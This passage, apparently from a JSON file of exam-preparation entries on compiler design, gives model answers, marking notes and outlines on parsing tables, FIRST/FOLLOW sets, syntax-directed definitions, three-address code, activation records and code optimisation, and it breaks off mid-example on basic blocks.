so it flows upward and is evaluated in postorder (bottom-up).\nExample: E -> E1 + T { E.val = E1.val + T.val }; E -> T { E.val = T.val }; T -> digit { T.val = digit.lexval }. For 3 + 4 the leaves carry 3 and 4, the + node computes 7, and the root value is the value of the whole expression.\nInherited attribute — computed from the parent, or from a sibling to its left, so it flows downward or sideways and carries context into a subtree.\nExample: D -> T L { L.in = T.type }; T -> int { T.type = int }; L -> L1 , id { L1.in = L.in; enter(id.name, L.in) }; L -> id { enter(id.name, L.in) }. With T = int, L.in = int is passed down so both identifiers are entered as int.\nA definition that uses only synthesized attributes is S-attributed and is evaluated in one bottom-up pass. If every inherited attribute depends only on the parent and on left siblings, the definition is L-attributed and can be evaluated in one left-to-right depth-first pass, which is what top-down translation needs."},"cdc-48":{"u":4,"logic":"Two recall blocks joined by nothing: type expressions and LL(1) properties. Cheap marks, but students write one example and forget the table condition that actually defines LL(1).","how":"Six type expressions in one column, then three properties plus the formal table condition. The disjoint FIRST/FOLLOW test is the line examiners look for.","skel":["Type expression definition","int, array(2, int), pointer(int), record","Function type and type_error","LL(1): no left recursion, left-factored","One entry per M[A, a] cell"],"ans":"A type expression is a symbolic representation of the type of a language construct, built from basic types and type constructors. It is what the semantic analyser stores and compares.\nExamples:\n• int, real, char, boolean\n• array(2, int) — an array of two integers; array(3, array(2, int)) — a 3 by 2 matrix\n• pointer(int) or int pointer, written pointer(pointer(char)) when nested\n• record{name: char pointer, age: int} for a structure\n• function: int x int -> int, a function taking two integers and returning an integer\n• type_error, the value given to an ill-typed construct.\nProperties of an LL(1) grammar, i.e. one a predictive parser can handle with one lookahead token:\n• it has no left recursion, so A -> A a has been rewritten to A -> b A', A' -> a A' | e\n• it is left-factored, so no two productions of a non-terminal share a common prefix\n• it is unambiguous, so each string has exactly one parse tree\n• for A -> a1 | a2 | ... the FIRST sets of the alternatives are pairwise disjoint\n• if a production can derive e, then FIRST(A) and FOLLOW(A) are disjoint\n• the LL(1) table has at most one production in every cell M[A, a], so no backtracking is needed and parsing is linear in the input length."},"cdc-49":{"u":1,"logic":"Tests translation versus execution, then whether you can justify the symbol table phase by phase. A justification that says only it stores names ignores the code-generation and scoping reasons.","how":"Six-row comparison table, then four bullets, one per phase that touches the table. The per-phase argument is the justification.","skel":["Six-row compiler vs interpreter table","Symbol table definition and operations","Lexical inserts, parser checks redeclaration","Semantic needs type and scope","Codegen needs storage class and offset"],"ans":"Compiler vs interpreter:\n• Translation: a compiler translates the whole program into object code before running it; an interpreter executes the source statement by statement.\n• Output: the compiler produces an object or executable file; the interpreter produces only results, no file.\n• Speed: compiled code runs faster because decoding happens once; interpretation is slower.\n• Errors: the compiler scans everything and reports all errors together; the interpreter stops at the first error.\n• Memory: the compiler needs space for the object code and is itself larger; the interpreter needs less.\n• Examples: C, C++, Go are compiled; Python, JavaScript, Ruby are interpreted. Java uses both (javac then the JVM).\nSymbol table is a necessary component — every phase uses it:\n• Lexical analysis inserts each identifier as it is recognised, with its lexeme.\n• Syntax analysis checks redeclaration and records structure (array bounds, parameter lists) as the declaration is parsed.\n• Semantic analysis needs the declared type of every id to check int + real, to resolve scope, and to check the number and types of arguments; this is its main input.\n• Intermediate code and code generation need the storage class and the offset of each variable to emit the right address, and register allocation needs to know which names are live.\nWithout the table, two variables with the same name in different scopes could not be distinguished and undeclared identifiers could not be reported. It is shared by all phases, so it is not optional."},"cdc-50":{"u":2,"logic":"Tests the lexical phase's job list and then subset construction. The automata half is where marks are lost: students write NFA states into DFA states without taking closures or merging equal sets.","how":"List five tasks, then do subset construction as a table: start set, transitions on a and b, stop when no new set appears. Draw the DFA from the table.","skel":["Tokens, lexemes, buffering, symbol table, errors","NFA for (a|b)*abb","Start set {0}, transitions a and b","Sets A to D, D is final","Draw DFA and name the final state"],"ans":"Major tasks of the lexical analysis phase:\n• Scan the character stream and group characters into lexemes, returning tokens as <token-name, attribute> such as <id, 1>, <num, 42>, <if>.\n• Skip blanks, tabs, newlines and comments.\n• Match each lexeme against the regular-expression patterns, taking the longest match (maximal munch); keywords are recognised by a reserved-word table checked after the identifier pattern.\n• Insert identifiers and constants into the symbol table and literal table.\n• Buffer the input (two buffers with a sentinel) so that only one read is needed per buffer load.\n• Report lexical errors such as an illegal character or an unterminated string to the error handler.\nNFA to DFA for (a|b)*abb. NFA: state 0 on a goes to 0 and to 1, on b to 0; 1 on b goes to 2; 2 on b goes to 3; 3 is final.\nSubset construction, DFA state = set of NFA states, closed under epsilon transitions:\nA = {0}: on a -> {0, 1} = B; on b -> {0} = A\nB = {0, 1}: on a -> {0, 1} = B; on b -> {0, 2} = C\nC = {0, 2}: on a -> {0, 1} = B; on b -> {0, 3} = D\nD = {0, 3}: on a -> {0, 1} = B; on b -> {0} = A\nDFA states A, B, C, D with A the start state and D the only final state (it is the only set containing 3). Draw four circles with the transitions above; the table is the construction and the diagram is the answer."},"cdc-51":{"u":2,"logic":"Tests two parsers that do the same job by different machinery (code versus table), then FIRST/FOLLOW on a grammar full of epsilon productions. Epsilon handling is the discriminator.","how":"Five-row comparison, then FIRST from the bottom up and FOLLOW from the top down. For an epsilon production, its FOLLOW decides the entry.","skel":["Recursive descent: procedure per non-terminal","Predictive: table M[A, a] plus stack","Five-row comparison","FIRST: A has epsilon, B has epsilon","FOLLOW of T, B, F from FOLLOW(E)"],"ans":"Recursive descent parsing: one procedure per non-terminal; the procedure for A looks at the next token and calls the procedures of the right-hand side, backtracking if the grammar is not predictive.\nNon-recursive predictive parsing: a table M[A, a] and an explicit stack; the parser pops a non-terminal, looks up M[A, a] and pushes the production's right side in reverse. No recursion, no backtracking.\nDifferences:\n• Implementation: hand-written procedures vs a driver loop plus a table.\n• Data needed: code only vs FIRST, FOLLOW and the LL(1) table.\n• Stack: the run-time call stack vs a symbol stack.\n• Error reporting: easier, per procedure vs centralised.\n• Generation: hand-coded vs produced by a tool; both need an LL(1) grammar.\nFor E -> T A; A -> + T A | e; T -> F B; B -> * F B | e; F -> ( E ) | id:\nFIRST: F = { (, id }; B = { *, e }; T = { (, id }; A = { +, e }; E = { (, id }.\nFOLLOW:\nFOLLOW(E) = { ), $ }\nFOLLOW(A) = FOLLOW(E) = { ), $ }\nFOLLOW(T) = FIRST(A) minus e, union FOLLOW(E) = { +, ), $ }\nFOLLOW(B) = FOLLOW(T) = { +, ), $ }  (B ends T -> F B)\nFOLLOW(F) = FIRST(B) minus e, union FOLLOW(T) = { *, +, ), $ }\nTable entries: E -> T A on ( and id; A -> + T A on +; A -> e on ) and $; T -> F B on ( and id; B -> * F B on *; B -> e on +, ) and $; F -> ( E ) on (; F -> id on id. No cell holds two productions, so the grammar is LL(1)."},"cdc-52":{"u":2,"logic":"The SLR construction drill: LR(0) items, FOLLOW-based reductions, accept only on $. Marks are lost mostly through wrong FOLLOW sets or putting a reduce on a terminal that is not in FOLLOW of the left side.","how":"Build nine states first (I0 to I8), then fill reduce entries only where the lookahead is in FOLLOW. Write FOLLOW(T) = FOLLOW(F) once and reuse it.","skel":["Augment S' -> E, list productions","I0 closure, goto E, T, F, id","Reach I8 through + and *","FOLLOW(E), FOLLOW(T), FOLLOW(F)","ACTION and GOTO, accept on $"],"ans":"Grammar: S -> E, E -> E + T | T, T -> T * F | F, F -> id. Augmented to S' -> E.\nFOLLOW(E) = { +, ), $ }; FOLLOW(T) = { +, *, ), $ }; FOLLOW(F) = { +, *, ), $ }.\nLR(0) item sets:\nI0: S'->.E, E->.E+T, E->.T, T->.T*F, T->.F, F->.id  goto E 1, T 2, F 3, id 4\nI1: S'->E., E->E.+T   goto + 5\nI2: E->T., T->T.*F    goto * 6\nI3: T->F.\nI4: F->id.\nI5: E->E+.T, T->.T*F, T->.F, F->.id  goto T 7, F 3, id 4\nI6: T->T*.F, F->.id   goto F 8, id 4\nI7: E->E+T., T->T.*F  goto * 6\nI8: T->T*F.\nSLR table (s = shift, g = goto, r = reduce):\n0: id s4; E g1, T g2, F g3\n1: + s5; $ accept\n2: + reduce E->T; * s6; ) reduce; $ reduce\n3: reduce T->F on +, *, ), $\n4: reduce F->id on +, *, ), $\n5: id s4; T g7, F g3\n6: id s4; F g8\n7: + reduce E->E+T; * s6; ) reduce; $ reduce\n8: reduce T->T*F on +, *, ), $\nNo cell has two entries, so the grammar is SLR(1).\nParse of id + id * id: shift id, reduce F->id, T->F, E->T; shift +; shift id, reduce to T; shift *; shift id, reduce F->id, then T->T*F, then E->E+T; accept on $."},"cdc-53":{"u":3,"logic":"Tests whether you can evaluate an SDD on a real parse tree: structure top-down, values bottom-up. The parenthesised subtree is where marks are lost, and the root value must be 85.","how":"Draw the whole tree first with leaves 5, 3, 2, 5, then annotate upwards: products 15, then 17, then the outer product. Write val beside every node.","skel":["Write the six-rule SDD","Draw tree for (5*3+2)*5","Leaves: 5, 3, 2, 5","Inner product 15, sum 17","Root 17 * 5 = 85"],"ans":"A syntax-directed definition attaches semantic rules to each production; an annotated parse tree is the parse tree with every attribute value written beside its node.\nSDD:\nE -> E1 + T   { E.val = E1.val + T.val }\nE -> T        { E.val = T.val }\nT -> T1 * F   { T.val = T1.val * F.val }\nT -> F        { T.val = F.val }\nF -> ( E )    { F.val = E.val }\nF -> digit    { F.val = digit.lexval }\nInput (5 * 3 + 2) * 5. Tree and values, bottom-up:\nLeaves: F(5) val 5, F(3) val 3, F(2) val 2, F(5) val 5.\nInner 5 * 3: T -> T1 * F with T1 = F(5) = 5 and F = 3, so T.val = 15; then T -> F gives the left operand of + the value 15.\nInner sum: E -> E1 + T with E1 = T(5*3) = 15 and T = F(2) = 2, so E.val = 15 + 2 = 17.\nBrackets: F -> ( E ) copies the value, so F.val = 17.\nOuter product: T -> T1 * F with T1 = F(17) = 17 and F = 5, so T.val = 17 * 5 = 85.\nRoot value 85, which is the value of the whole expression. Draw the outer * at the root, the bracketed E as its left child and F(5) as its right child, and write val at the right of every node."},"cdc-54":{"u":4,"logic":"Tests static versus dynamic typing and then demands the checking rules as an SDD. Most answers compare the two but cannot turn if, while and sequence into type rules.","how":"Six-row table, then an SDD where every rule is an if-then-else on .type and the error value is type_error. Statements produce void.","skel":["Six-row static vs dynamic table","E -> id, E1 + E2 with coercion","S -> id = E checks assignment compatibility","if and while demand a boolean","S1; S2 both void"],"ans":"Static vs dynamic type checking:\n• Time: static at compile time; dynamic while the program runs.\n• Basis: declarations and type rules in the SDD vs run-time type tags and descriptors.\n• Errors: static reports every type error before execution; dynamic aborts or raises an exception at the failing statement.\n• Cost: static costs compile time and no run-time speed; dynamic costs a check on every operation.\n• Flexibility: static rejects some correct programs (no int-or-string variable); dynamic accepts them.\n• Languages: C, C++, Java mostly static; Python, JavaScript, Lisp dynamic. Java is static plus a run-time check on downcasts.\nType checking by SDD, where .type is either a type or type_error, and a statement's type is void:\nE -> id { E.type = lookup(id.name).type }\nE -> E1 + E2 { if E1.type = int and E2.type = int then E.type = int else if E1.type and E2.type are numeric then E.type = real else E.type = type_error }\nE -> E1 relop E2 { if E1.type = E2.type then E.type = boolean else E.type = type_error }\nE -> ( E1 ) { E.type = E1.type }\nS -> id = E { if lookup(id.name).type = E.type then S.type = void else S.type = type_error }\nS -> if E then S1 { if E.type = boolean then S.type = S1.type else S.type = type_error }\nS -> while E do S1 { if E.type = boolean then S.type = S1.type else S.type = type_error }\nS -> S1 ; S2 { if S1.type = void and S2.type = void then S.type = void else S.type = type_error }\nCoercion: for E1 + E2 with int and real, emit inttoreal(E1) and set the result type to real. Any type_error propagates upward so the compiler reports the statement, not the subexpression."},"cdc-55":{"u":7,"logic":"Tests do-while control flow in three-address code: the body runs once and the test is at the bottom, so the back jump goes to the first statement. Most students write it as a while loop and lose the marks.","how":"Number from 100, body first, test last, back jump to 100. Then list the 3AC instruction forms. Never place the test before the body.","skel":["Define 3AC: one operator per statement","List the instruction forms","100: t1 = n - p","101: m = t1","102: if a <= b goto 100"],"ans":"Three-address code is an intermediate representation in which each instruction has at most one operator on the right and at most three names. Forms: x = y op z; x = op y; x = y; goto L; if x relop y goto L; param x; call p, n; return y; x = y[i]; x[i] = y; x = &y; x = *y; *x = y.\nFor S -> do m = n - p while a <= b, the statement is a do-while, so the assignment is executed first and the condition is tested afterwards; while the condition is true control returns to the assignment.\n100: t1 = n - p\n101: m = t1\n102: if a <= b goto 100\n103: next\n100 is the label of the loop body start, 102 is the test, and when the condition is false control falls through to 103, the statement after the loop.\nAs quadruples: (100) (-, n, p, t1); (101) (=, t1, -, m); (102) (if<=, a, b, 100).\nAs triples: (0) (-, n, p); (1) (=, m, (0)); (2) (if<=, a, b, 0).\nCompare with a while loop, where the test would be placed at 100 and the body after it; that difference is the point of this question."},"cdc-56":{"u":9,"logic":"Definition plus three worked techniques, marks split evenly. Each technique needs both a rule and a before/after fragment; a definition alone earns a fraction.","how":"Pick CSE, constant folding with propagation, and dead code. Take one block and optimise it three times so the example is reused rather than invented.","skel":["Define optimisation and correctness","CSE: reuse a computed value","Constant folding: 2*3.14 becomes 6.28","Dead code: delete unused definitions","Loop-invariant motion as a bonus"],"ans":"Code optimisation is the phase that rewrites the intermediate code so the target program runs faster, occupies less memory and uses less power, without changing its observable behaviour; the gain must also justify the compile time spent.\n• Common subexpression elimination (CSE): if the same expression has already been computed and its operands have not changed, reuse the value. t1 = b * c; t2 = b * c becomes t1 = b * c; t2 = t1, saving one multiply.\n• Constant folding and constant propagation: evaluate constant expressions at compile time and substitute known values. x = 2 * 3.14 becomes x = 6.28; if a = 5 then b = a + 1 becomes b = 6. Conditionals such as if (1) are simplified and dead branches removed.\n• Dead code elimination: a definition whose value is never used is deleted. In t = a * b; a = 2; print(a), t is never read, so the multiply and the assignment are removed; an unreachable statement after a goto is removed too.\n• Loop-invariant code motion (extra): x = a * b inside a loop that does not assign a or b is moved before the loop, so it executes once instead of n times.\n• Strength reduction (extra): 2 * x becomes x + x, x * 8 becomes x << 3, x^2 becomes x * x.\nScope: local (one basic block), global (whole procedure, using data-flow analysis such as reaching definitions and live variables), and interprocedural."},"cdc-57":{"u":6,"logic":"Tests the frame layout and specifically the caller-callee contract: who evaluates arguments, who saves registers, who restores FP. Students draw the diagram but cannot divide the work.","how":"Draw the seven-part frame bottom to top, then two columns: caller does, callee does — separately for call and for return.","skel":["Draw frame: parameters to temporaries","Control link vs access link","Caller evaluates arguments, saves return address","Callee saves FP, allocates locals","Return: restore SP and FP, jump back"],"ans":"An activation record (frame) is the block of storage created for one execution of a procedure. It is pushed on the run-time stack when the procedure is called and popped when it returns. From the caller's frame upwards:\n• actual parameters (arguments)\n• return value, or space reserved for it\n• control link (dynamic link): pointer to the caller's frame, used to restore the frame pointer on return\n• access link (static link): pointer to the frame of the lexically enclosing procedure, used for non-local references\n• saved machine status: return address, old frame pointer, caller-saved registers\n• local data: the declared local variables\n• temporaries: compiler-generated intermediate values\nCaller's activities before the call:\n1. Evaluate the actual parameters and place them in the new frame or in registers.\n2. Save the return address and any registers the callee may destroy.\n3. Create the frame (or pass its address), set the new frame pointer, and jump to the callee's entry point.\nCallee's activities on entry:\n1. Save the old frame pointer and set FP to the base of its own frame.\n2. Allocate local data and temporaries by lowering the stack pointer.\n3. Execute the body, reaching parameters and locals through FP and non-locals through the access link.\nCallee's activities on return:\n1. Place the return value where the caller expects it.\n2. Restore the stack pointer, pop the frame, restore the old FP from the control link and the saved registers.\n3. Jump to the saved return address; the caller then removes the arguments."},"cdc-58":{"u":8,"logic":"Tests code-generator design awareness rather than TAC generation: can you name the machine, IR and policy factors that change the emitted instructions? Listing only registers is not enough.","how":"Eight named factors with one line each on how the generated code changes. Add one addressing-mode example (x = y[i] in a single instruction).","skel":["Target ISA and instruction formats","Registers available and allocation policy","Addressing modes save instructions","IR form and basic-block structure","Memory hierarchy, scheduling, peephole"],"ans":"Factors affecting target code generation:\n• Target machine instruction set: which operations exist. With no multiply instruction the generator must emit shifts and adds; register-to-register and register-to-memory machines need different sequences.\n• Number and types of registers: more registers mean fewer loads, stores and spills, and floating-point registers change how reals are moved.\n• Addressing modes: indexed, indirect and auto-increment modes let x = y[i] become one instruction instead of separate address arithmetic.\n• Instruction cost and timing: the generator must pick the cheapest correct sequence, not the most obvious one, and must respect delayed branches and pipeline stalls.\n• IR form and quality: three-address code organised into basic blocks with good temporaries produces better code than a raw tree with redundant temporaries.\n• Register allocation and assignment policy: graph colouring, spilling, and which value is kept in a register across a block boundary.\n• Instruction selection and ordering: tree-pattern matching over the DAG, then scheduling to hide memory latency.\n• Memory hierarchy: cache locality — loop order and data layout decide how many cache misses the code causes.\n• Peephole optimisation after generation: removes redundant loads and stores, jump-to-jump and constant computations.\n• Run-time environment and ABI: calling conventions, stack alignment, position-independent code and debugging information constrain the choices.\nThe factors conflict, and optimal instruction selection is NP-hard in general, so practical generators use heuristic and DAG-based selection with a cost model."},"cdc-59":{"u":2,"logic":"Tests the front-end design trade-off and then a nullable grammar where every epsilon entry in the table must come from FOLLOW. Getting FOLLOW(B) and FOLLOW(C) right is the whole question.","how":"Four-row comparison, then FIRST with epsilon marked, then FOLLOW left to right. Put the epsilon productions in using FOLLOW only.","skel":["One-pass vs multi-pass: four rows","FIRST with epsilon for A, C, D","FOLLOW(B) = {0, $}","FOLLOW(C) = {d, $}","Table, no cell twice, so LL(1)"],"ans":"One-pass vs multi-pass compiler:\n• Passes: one traversal of the source vs several traversals, each doing one job.\n• Intermediate code: none, code is emitted directly vs an IR is written and read between passes.\n• Speed: compilation is faster vs slower.\n• Optimisation: only local peephole vs global optimisation over the whole procedure.\n• Memory: small vs large, because the IR and tables persist.\n• Forward references: a one-pass compiler needs declaration before use vs a multi-pass compiler can resolve them.\nLL(1) table for S -> A B C D, A -> a | e, B -> b, C -> 0 | e, D -> d | e.\nFIRST: S = { a, b }; A = { a, e }; B = { b }; C = { 0, e }; D = { d, e }.\nFOLLOW: S = { $ }; A = FIRST(B) = { b }; B = (FIRST(C) minus e) union FOLLOW(S) = { 0, $ }; C = (FIRST(D) minus e) union FOLLOW(S) = { d, $ }; D = FOLLOW(S) = { $ }.\nTable (epsilon entries come from FOLLOW):\nS: a -> S -> ABCD; b -> S -> ABCD\nA: a -> A -> a; b -> A -> e\nB: b -> B -> b\nC: 0 -> C -> 0; d -> C -> e; $ -> C -> e\nD: d -> D -> d; $ -> D -> e\nEvery cell contains at most one production, so the grammar is LL(1). Reading the table: on input a b 0 d the parser expands S, then A -> a, B -> b, C -> 0, D -> d and accepts; on b b $ it uses A -> e, B -> b, C -> e, D -> e and accepts."},"cdc-60":{"u":2,"logic":"Tests maximal-munch token recognition with a keyword-versus-identifier example, then position-based DFA construction where the Kleene star sends followpos back into its own set.","how":"Explain longest match with ifx against if, then number positions and compute followpos; the star's followpos contains its own firstpos plus what follows the star.","skel":["Token = name plus attribute value","Longest match: ifx is an id, not if","Number positions 1 to 7","followpos: 2,3 to 4,5; 4,5 to 4,5,6","DFA A to B to C loop, C to D on a"],"ans":"Recognising a token: the scanner matches the longest prefix of the remaining input against the patterns (regular expressions) of the token classes, then returns a token <token-name, attribute-value>. All patterns are compiled into one DFA; the longest match wins, and if two patterns match the same length, the one listed first (a keyword before an identifier) is chosen.\nExample: input ifx = 12. The scanner reads i, f, x and finds that ifx matches the identifier pattern over its whole length, so it returns <id, entry for ifx>, not the keyword if; then = returns <assign> and 12 returns <num, 12>. Input if (a < 10): the longest match at if is exactly the two letters, the reserved-word table is checked and <if> is returned.\nDFA for a(a+b)(b+c)*a# by positions: 1:a, 2:a, 3:b, 4:b, 5:c, 6:a, 7:#.\nnullable: only (4|5)* is nullable. firstpos and lastpos: 1 -> {1}; (2|3) -> {2,3}; star -> {4,5}; 6 -> {6}; 7 -> {7}.\nfollowpos:\n1 -> {2,3}\n2 -> {4,5}; 3 -> {4,5}\n4 -> {4,5,6}; 5 -> {4,5,6}   (star loops back, and the following a can also start)\n6 -> {7}\nstart = firstpos(root) = {1}.\nA = {1} --a--> {2,3} = B\nB --a--> {4,5,6} = C;  B --b--> C\nC --b--> C;  C --c--> C;  C --a--> {7} = D (final)\nFour states: A is the start, D the only final state, and the loop on C for b and c is the (b+c)* part. Draw the four circles with these transitions."},"cdc-61":{"u":2,"logic":"Tests LR(1) lookahead propagation on a nullable grammar, the classic case where SLR fails because FOLLOW(A) equals FOLLOW(B). Lookaheads must be computed from what follows each non-terminal.","how":"Only $ appears as a kernel lookahead; A -> epsilon gets lookahead a and B -> epsilon gets b, from the productions. Ten small states are enough.","skel":["Augment to S' -> S","I0: A -> . with a, B -> . with b","goto A, B, a, b gives I2 to I4","I5 shifts b, I6 reduces S -> AaAb","Mirror branch I7 to I9 for BbBa"],"ans":"Grammar: S -> AaAb | BbBa, A -> e, B -> e; augmented S' -> S.\nClosure uses FIRST of the string after each non-terminal, so in the start state A carries lookahead a and B carries lookahead b:\nI0: [S'->.S, $], [S->.AaAb, $], [S->.BbBa, $], [A->., a], [B->., b]\nI1 = goto(I0, S): [S'->S., $]\nI2 = goto(I0, A): [S->A.aAb, $]\nI3 = goto(I0, B): [S->B.bBa, $]\nI4 = goto(I2, a): [S->Aa.Ab, $], [A->., b]\nI5 = goto(I4, A): [S->AaA.b, $]\nI6 = goto(I5, b): [S->AaAb., $]\nI7 = goto(I3, b): [S->Bb.Ba, $], [B->., a]\nI8 = goto(I7, B): [S->BbB.a, $]\nI9 = goto(I8, a): [S->BbBa., $]\nLR(1) parsing table:\n0: a reduce A->e; b reduce B->e; A g2; B g3\n1: $ accept\n2: a s4\n3: b s7\n4: b reduce A->e\n5: b s6\n6: $ reduce S->AaAb\n7: a reduce B->e\n8: a s9\n9: $ reduce S->BbBa\nNo cell holds two entries, so the grammar is LR(1). State 0 reduces A -> e only on a and B -> e only on b, which is exactly what the lookaheads provide: FOLLOW(A) = FOLLOW(B) = {a, b}, so an SLR table would put both reduces in both columns and report a reduce-reduce conflict. This is the standard proof that LR(1) is more powerful than SLR(1)."},"cdc-62":{"u":9,"logic":"Tests the why of optimisation (cost, not correctness) plus two loop techniques with real before/after code. Loop optimisations give the biggest practical gains, so they ask for these.","how":"Two lines of need, then loop-invariant motion and induction-variable strength reduction, each with a four-line before/after. Name the saving in operations.","skel":["Need: time, space, power, cache","Must preserve semantics","Hoist a * b out of the loop","Strength reduction: i*4 becomes p += 4","Before/after with savings counted"],"ans":"Code optimisation is needed because a direct translation is naive: it recomputes values, keeps variables that are never used, uses an expensive instruction where a cheap one exists, and leaves loop invariants inside the loop. Optimising gives faster execution, smaller object code, lower power and better cache behaviour, and it reduces the memory the program needs — all without changing what the program computes.\nTwo loop optimisation techniques:\n• Loop-invariant code motion: an expression whose operands are not changed inside the loop is computed once before it. Before: for i = 1 to n do { x = a * b; s = s + x }. After: x = a * b; for i = 1 to n do { s = s + x }. The multiply now runs once instead of n times, and x is live across the loop.\n• Strength reduction and induction variable elimination: replace an expensive operation on the loop variable by an addition. Before: for i = 1 to n do a[i] = 0, where each iteration computes the address base + i*4. After: p = base; for i = 1 to n do { *p = 0; p = p + 4 }. The multiply disappears and only an add remains.\nThe same idea covers 2*i becoming i + i or i << 1, and loop unrolling, which reduces the loop overhead per iteration. All of them preserve semantics, which is the first requirement of any optimisation."},"cdc-63":{"u":7,"logic":"Tests whether you can define TAC and actually translate an expression, not just recite 'at most one operator per instruction'.","how":"Write the definition line, then one emitted instruction per operator node, bottom-up — the three TAC lines carry the example marks.","skel":["Define form x = y op z","Parse tree, temporary per operator node","Convert a = b*c + d","Show t1, t2, then a = t2"],"ans":"Three-address code (TAC) is an intermediate representation in which each instruction has at most one operator on the right and at most three operands, of the form x = y op z.\nHigh-level code is converted by syntax-directed translation: the parser walks the parse tree and emits a new temporary for every interior (operator) node, so a nested expression becomes a chain of simple instructions.\nExample: a = b * c + d\n• t1 = b * c\n• t2 = t1 + d\n• a = t2\nSteps: (1) build the parse tree; (2) go bottom-up in postorder, giving each operator node a fresh temporary; (3) emit (op, arg1, arg2, result) for each node; (4) copy the last temporary into the target. Control flow uses labels and goto, and a[i] = b becomes t1 = i*4; t2 = a[t1]."},"cdc-64":{"u":4,"logic":"Two unrelated short topics in one 5-mark question; the examiner checks you can define each precisely and give a real type rule.","how":"Two labelled halves of two lines each: activation tree as a small diagram, then three type rules written as conditions.","skel":["Activation tree = tree of live activations","Root main, each node a call","Type checking = rules assigning types","int+real→real, int+string→error"],"ans":"Activation tree — the tree of procedure activations during one run of a program. Each node is an activation (a live call) of a procedure, the root is the activation of main, and the children of a node are the calls that activation makes. It is dynamic: the same procedure can appear many times, its height gives maximum stack depth, and it shows how activation records are pushed and popped.\nType checking system — the set of rules that assigns a type to every expression and rejects inconsistent ones before execution:\n• int + int → int; int + real → real (widening); int + string → type error.\n• if E then S needs E.type = boolean.\n• a[i] needs a : array(n, t) and i : int, and gives t; p↑ needs p : pointer(t).\nStatic checking (C, Java) at compile time; dynamic checking (Python) at run time."},"cdc-65":{"u":7,"logic":"Checks why the middle of a compiler exists at all, plus whether you know the symbol table's actual fields rather than its data structures.","how":"Four bullets of advantage, then eight symbol-table fields in one line each — the list is the marks.","skel":["Machine independence, easy retargeting","Enables machine-independent optimisation","Simplifies the code generator","Symbol table: name, type, kind, scope, offset"],"ans":"Advantages of intermediate code:\n• Machine independence — one front end serves many machines; only the back end is rewritten, so a compiler is easily retargeted.\n• Optimisation — transformations such as CSE, constant folding and loop optimisation are written once on the IR instead of once per machine.\n• Simplicity — the code generator sees only a handful of instruction forms (assignment, jump, call) instead of the whole source language.\n• Portability of tools — interpreters, debuggers and source-level analysers can all work on the printed IR; errors in the front end are visible early.\nSymbol table information: name (lexeme), type and type expression, kind — variable/function/class/constant/parameter, scope or nesting level, storage class (auto, static, extern, register), offset within its activation record, size in bytes, line of declaration, array dimensions and bounds, parameter list and return type for functions, and value for constants."},"cdc-66":{"u":3,"logic":"Tests the difference between a parse tree and its attribute values, and whether you know S-attributed means synthesised-only and one pass.","how":"Draw a tiny 3+4 tree and write a value on every node — the drawing is the proof that you understand 'annotated'.","skel":["Annotated tree = parse tree + attribute values","S-attributed uses synthesised attributes only","Example grammar E→E+T | T, T→num","Annotate 3+4 bottom-up: 7 at root"],"ans":"An annotated parse tree is a parse tree in which every node also carries the values of its attributes, so the tree shows the syntax and the computed meaning together. The semantic rules of the syntax-directed definition fill the values in; for synthesised attributes this is a bottom-up, post-order walk.\nS-attributed grammar — an SDD that uses only synthesised attributes, so each value depends only on the children. It can therefore be evaluated in a single bottom-up pass during parsing.\nExample:\nE → E1 + T  { E.val = E1.val + T.val }\nE → T        { E.val = T.val }\nT → num     { T.val = num.lexval }\nFor the input 3 + 4, the leaves carry 3 and 4; the two T nodes copy them (val = 3, val = 4); the E node under + computes 3 + 4 and stores val = 7; the root E also shows val = 7 on the annotated tree."},"cdc-67":{"u":3,"logic":"Wants the definition of SDT plus one worked translation; most students write only theory and lose the example half.","how":"Define, name the two forms (SDD and translation scheme), then run infix to postfix on one expression.","skel":["Definition: grammar plus semantic actions","SDD vs translation scheme","Rules: E→E+T emits '+' after operands","Work 9+5+2 → 9 5 + 2 +"],"ans":"Syntax-directed translation (SDT) is a method of translation in which semantic rules or program fragments (actions) are attached to the productions of a context-free grammar, so the parser produces output while it parses instead of building a tree first.\nTwo forms: a syntax-directed definition (SDD), where each production has rules that compute attributes; and a translation scheme, where the actions are embedded in the right side and executed at the point the parser reaches them.\nExample — infix to postfix:\nE → E1 + T  { E.code = E1.code ‖ T.code ‖ '+' }\nE → T        { E.code = T.code }\nT → num     { T.code = num.lexval }\nAttributes here are synthesised, so evaluation is bottom-up. For 9 + 5 + 2 the left E produces \"9 5 +\", then the root appends \"2 +\"; the final code is 9 5 + 2 +. The same mechanism emits three-address code, builds syntax trees (mknode/mkleaf) or enters names in the symbol table."},"cdc-68":{"u":2,"logic":"Pure table simulation — tests whether you can drive an SLR parser by hand, not merely construct tables.","how":"Three columns: stack, input, action; write the rule number on every reduce and the goto state after it.","skel":["State grammar rules 1–5 from the paper","Stack | input | action table","Reduce always names the production and goto","Finish with ACCEPT on state 2"],"ans":"Grammar from the table: (1) E → T + E, (2) E → T, (3) T → int * T, (4) T → int, (5) T → ( E ). Parsing int * ( int + int ) $:\nStack | Input | Action\n1 | int*(int+int)$ | shift 5\n1 5 | *(int+int)$ | shift 8\n1 5 8 | (int+int)$ | shift 4\n1 5 8 4 | int+int)$ | shift 5\n1 5 8 4 5 | +int)$ | reduce T→int (R4), goto(4,T)=3\n1 5 8 4 3 | +int)$ | shift 6\n1 5 8 4 3 6 | int)$ | shift 5\n1 5 8 4 3 6 5 | )$ | reduce R4, goto(6,T)=3\n1 5 8 4 3 6 3 | )$ | reduce E→T (R2), goto(6,E)=9\n1 5 8 4 3 6 9 | )$ | reduce E→T+E (R1), goto(4,E)=7\n1 5 8 4 7 | )$ | shift 10\n1 5 8 4 7 10 | $ | reduce T→(E) (R5), goto(8,T)=11\n1 5 8 11 | $ | reduce T→int*T (R3), goto(1,T)=3\n1 3 | $ | reduce E→T (R2), goto(1,E)=2\n1 2 | $ | ACCEPT\nEvery step is shift or a single reduce with no conflict, so the string is accepted."},"cdc-69":{"u":8,"logic":"Two syllabus items that recur as a pair: block identification is mechanical, the factors list is memorised.","how":"Give the three leader rules as a numbered list first, then five factors with half a line each.","skel":["Leader: first instruction, jump target, after a jump","Block runs from a leader to the next leader","Factors: instruction set, registers","Addressing modes, IR form, allocation"],"ans":"Recognising basic blocks — a basic block is a maximal straight-line sequence of three-address statements with one entry and one exit. Its first statement is a leader; leaders are found by three rules:\n1. The first statement of the program is a leader.\n2. Any statement that is the target of a conditional or unconditional goto is a leader.\n3. Any statement that immediately follows a goto or a conditional goto is a leader.\nA basic block runs from a leader up to, but not including, the next leader. Example:\nL1: t1 = a + b\nt2 = t1 * c\nif t2 > 10 goto 